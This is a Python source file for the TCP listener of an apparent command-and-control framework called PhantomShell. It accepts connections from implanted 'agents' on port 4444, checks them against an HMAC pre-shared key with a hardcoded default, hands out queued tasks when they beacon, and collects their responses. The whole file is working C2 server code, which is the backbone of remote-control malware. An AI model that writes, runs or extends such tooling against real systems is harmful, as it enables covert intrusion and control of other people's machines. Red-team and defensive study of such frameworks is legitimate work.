"""TCP listener — accepts agent connections and manages sessions."""

import hashlib
import hmac
import json
import logging
import os
import socket
import struct
import threading
import uuid

PSK = os.environ.get("PS_AUTH_KEY", "phantomshell-default-key")

log = logging.getLogger("phantom.c2.tcp")


class TcpListener:
    """Multi-threaded TCP listener for agent connections."""

    def __init__(self, host: str = "0.0.0.0", port: int = 4444,
                 session_manager=None):
        self.host = host
        self.port = port
        self.session_manager = session_manager
        self._server: socket.socket | None = None
        self._running = False
        self._thread: threading.Thread | None = None

    def start(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind((self.host, self.port))
        self._server.listen(20)
        self._server.settimeout(1.0)
        self._running = True
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        log.info(f"[+] TCP listener started on {self.host}:{self.port}")

    def stop(self):
        self._running = False
        if self._server:
            self._server.close()
        log.info("[*] TCP listener stopped")

    def _accept_loop(self):
        while self._running:
            try:
                client, addr = self._server.accept()
                log.info(f"[+] New connection from {addr[0]}:{addr[1]}")
                t = threading.Thread(
                    target=self._handle_client, args=(client, addr), daemon=True
                )
                t.start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle_client(self, client: socket.socket, addr: tuple):
        session_id = None
        try:
            msg = self._recv_message(client)
            if not msg:
                client.close()
                return

            if msg.get("type") == "register":
                session_id = f"sess-{uuid.uuid4().hex[:8]}"
                agent_id = msg.get("agent_id", "unknown")

                # HMAC-SHA256 agent authentication — reject unverified agents
                expected_auth = hmac.new(PSK.encode(), agent_id.encode(), hashlib.sha256).hexdigest()
                if msg.get("auth") != expected_auth:
                    reject_ack = {
                        "message_id": str(uuid.uuid4()),
                        "timestamp": int(__import__("time").time()),
                        "sequence": 0,
                        "agent_id": agent_id,
                        "type": "ack",
                        "payload": {
                            "session_id": session_id,
                            "status": "rejected",
                        },
                    }
                    self._send_message(client, reject_ack)
                    client.close()
                    log.warning(f"[-] Agent auth failed for {agent_id} from {addr}")
                    return

                if self.session_manager:
                    self.session_manager.register(
                        session_id=session_id,
                        agent_id=agent_id,
                        addr=addr,
                        info=msg.get("payload", {}),
                        socket=client,
                    )

                ack = {
                    "message_id": str(uuid.uuid4()),
                    "timestamp": int(__import__("time").time()),
                    "sequence": 0,
                    "agent_id": agent_id,
                    "type": "ack",
                    "payload": {
                        "session_id": session_id,
                        "status": "accepted",
                    },
                }
                self._send_message(client, ack)
                log.info(f"[+] Agent registered: {agent_id} -> {session_id}")

            while self._running:
                msg = self._recv_message(client)
                if not msg:
                    break

                if msg.get("type") == "beacon":
                    if self.session_manager:
                        self.session_manager.update_beacon(session_id, msg.get("payload", {}))
                        task = self.session_manager.get_pending_task(session_id)
                        if task:
                            self._send_message(client, task)
                        else:
                            self._send_message(client, {
                                "message_id": str(uuid.uuid4()),
                                "timestamp": int(__import__("time").time()),
                                "sequence": 0,
                                "type": "ack",
                                "payload": {"status": "ok"},
                            })

                elif msg.get("type") == "response":
                    if self.session_manager:
                        self.session_manager.store_response(session_id, msg.get("payload", {}))

        except Exception as e:
            log.error(f"[-] Client handler error: {e}")
        finally:
            if session_id and self.session_manager:
                self.session_manager.mark_dead(session_id)
            try:
                client.close()
            except Exception:
                pass

    def _recv_message(self, sock: socket.socket) -> dict | None:
        try:
            length_data = self._recv_exact(sock, 4)
            if not length_data:
                return None
            length = struct.unpack(">I", length_data)[0]
            if length > 10 * 1024 * 1024:
                return None
            data = self._recv_exact(sock, length)
            if not data:
                return None
            return json.loads(data)
        except (json.JSONDecodeError, OSError):
            return None

    def _send_message(self, sock: socket.socket, msg: dict):
        data = json.dumps(msg).encode()
        sock.sendall(struct.pack(">I", len(data)) + data)

    @staticmethod
    def _recv_exact(sock: socket.socket, n: int) -> bytes | None:
        buf = bytearray()
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                return None
            buf.extend(chunk)
        return bytes(buf)
